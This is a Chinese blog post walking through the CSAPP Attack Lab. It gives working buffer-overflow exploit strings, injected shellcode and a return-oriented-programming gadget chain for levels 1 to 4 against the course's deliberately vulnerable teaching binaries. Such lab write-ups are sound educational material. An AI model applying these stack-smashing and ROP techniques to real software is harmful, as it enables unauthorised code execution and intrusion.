---
layout:     post   				    # 使用的布局（不需要改）
title:      深入理解计算机系统(CSAPP)_attack lab	# 标题 
#subtitle:   脚本，xss #副标题
date:       2020-07-16 				# 时间
author:     s-seven 						# 作者
header-img: img/post-bg-2015.jpg 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								#标签
    - CSAPP
---

# attack lab

这一次的实验主要实现对程序漏洞的攻击

拿到手的文件有：

ctarget：一个容易遭受code injection攻击的可执行程序。 

rtarget：一个容易遭受return-oriented programming攻击的可执行程序。 

cookie.txt：一个8位的十六进制码，用于验证身份的唯一标识符。 

farm.c：目标“gadget farm”的源代码，用于产生return-oriented programming攻击。 

hex2raw：一个生成攻击字符串的工具。

* getbuf函数

```C
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

getbuf函数是一种不检查输入字符长度的函数，我们可以输入一个超出buffersize的字符串来向getbuf之外的栈帧写入数据

## 第一部分 代码注入攻击

### level 1

这个等级中我们只需要进行缓冲区溢出将函数重定向到我们需要的函数处，通过汇编代码看到缓冲区有0x28大小，只要将这40个字符随意填充，再输入touch1的地址就可以了，注意函数地址是小端序

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

touch1的函数地址为0x4017c0，所以填充的字符串为

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

将字符串写入.txt文件中，用给的hexraw工具转换

[![UgJKn1.png](https://s1.ax1x.com/2020/07/18/UgJKn1.png)](https://imgchr.com/i/UgJKn1)

### level 2

```C
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) 
    {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }
    else 
    {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    } 
    exit(0);
}
```

这个函数有一个参数，参数在cookie.txt中已给出，传入的参数放在%rdi寄存器中，

我们的注入代码：

```assembly
pushq $0x4017ec   ;touch2函数地址压栈，用于retq返回
movq  $0x59b997fa,%rdi   ;传参
retq
```

[![Ugt5pF.png](https://s1.ax1x.com/2020/07/18/Ugt5pF.png)](https://imgchr.com/i/Ugt5pF)

得到十六进制指令码，因为还是用getbuf输入的，所以仍然构造字符串，最后的缓冲区起始地址为rsp的0x55674e78

```
68 ec 17 40 00 48 c7 c7 
fa 97 b9 59 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 
```

最后的结果为

[![UgNwH1.png](https://s1.ax1x.com/2020/07/18/UgNwH1.png)](https://imgchr.com/i/UgNwH1)

### level 3

```C
void touch3(char *sval){
    vlevel=3;
    if(hexmatch(cookie,sval)){
        printf("Touch3!: You called touch3(\"%s\")\n",sval);
        validate(3);
    }else{
        printf("Misfire: You called touch3(\"%s\")\n",sval);
        fail(3);
    }
    exit(0);
}
int hexmatch(unsigned val,char *sval){
    char cbuf[110];
    char *s = cbuf+random()%100;
    sprintf(s,"%.8x",val);
    return strncmp(sval,s,9) == 0;
}
```

在touch3中调用了hexmatch来比较输入的字符串和参数sval。

和上一关一样我们需要跳转到我们的注入代码首地址(注入代码首地址:0x5561dca0-0x28=0x5561dc78)，然后由注入代码将字符串数组首地址放在寄存器`%rdi`中，执行`retq`指令跳转到`touch3`函数(0x4018fa)

当前的`%rsp`为0x5561dca0,我们需要在之前写入参数(0x5561dca0+0x8(rsp中存8个字节))

16进制码为：

```
   0:   68 fa 18 40 00          pushq  $0x4018fa
   5:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   c:   c3                      retq 
```

构造的字符串为：

```
68 fa 18 40 00 48 c7 c7  <- 注入代码部分    0x5561dc78
a8 dc 61 55 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  
78 dc 61 55 00 00 00 00  <- 栈顶rsp所在位置 0x5561dca0
35 39 62 39 39 37 66 61  <- 存放的字符串    0x5561dca8
```

## 第二部分 返回导向编程攻击

### level 4

和之前的level2 差不多，我们要给rdi附上cookie的值，然后将touch2 的地址放在最后，ret就会跳转到touch2处。

反汇编rtarget中的代码找到我们需要的部分，发现一段

```
00000000004019c3 <setval_426>:
  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:   c3                      retq  
```

可以用到的指令为：

```
48 89 c7 movq %rax,%rdi
90       nop
c3       retq
```

还需要将值放入%rax中，可以用pop指令，找到

```
00000000004019ca <getval_280>:
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq  
```

可以用到

```
58 90 popq %rax
c3    retq
```

加上偏移得到我们需要的指令地址(0x4019ca+0x2=0x4019cc),(0x4019c3+0x2=0x4019c5)

构造字符串得

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00  <- 栈顶%rsp 填入数据0x4019cc
fa 97 b9 59 00 00 00 00  <- popq指令返回给%rax寄存器的数据
c5 19 40 00 00 00 00 00  <- retq返回到的地址(movq指令首地址)
ec 17 40 00 00 00 00 00  <- retq指令返回到touch2函数
```



### level 5

level 5不会。。。待补充